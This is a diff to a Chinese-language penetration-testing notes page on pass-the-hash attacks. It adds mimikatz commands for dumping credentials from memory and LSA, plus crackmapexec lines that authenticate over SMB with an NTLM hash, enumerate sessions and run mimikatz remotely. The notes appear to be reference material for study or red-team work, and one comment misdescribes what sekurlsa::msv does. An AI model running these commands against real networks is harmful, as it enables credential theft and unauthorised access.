@@ -24,8 +24,16 @@ description: 基于NTLM认证 / 不需要知道明文密码 / 较旧的且使用
 mimikatz.exe
 # 权限提升
 privilege::debug
-
+# 获取详细的用户凭证信息
 sekurlsa::logonpasswords full
+# 列出当前用户的凭据
+lsadump::lsa /patch
+# 获取DC上的所有域用户的NTLM哈希
+sekurlsa::msv
+# 
+
+
+
 ```
 
 ### Impacket
@@ -37,10 +45,18 @@ sekurlsa::logonpasswords full
 ### Crackmapexec
 
 ```bash
-# 
+# 使用NTLM哈希进行身份验证
+crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD
+# 在域环境中使用NTLM哈希进行身份验证
+crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD -d target.com
+# 列出活动会话
+crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --sessions
+# 利用NTLM哈希来获取TGT票据
+crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --kerberos
+# 利用NTLM哈希直接使用mimikatz提取凭据
+crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --mimikatz
+# 仅以smb模块举例，还有其他模块
 ```
-
-
 
 ### Metasploit
 
@@ -54,8 +70,6 @@ use auxiliary/scanner/smb/smb_login
 # smbexec模块
 use exploit/windows/smb/smbexec
 ```
-
-
 
 {% hint style="info" %}
 哈希传递攻击分为针对本地用户账户和域用户账户，通过抓取目标用户的NTLM哈希来绕过明文密码登录，其本质就是冒充特定的用户账户。
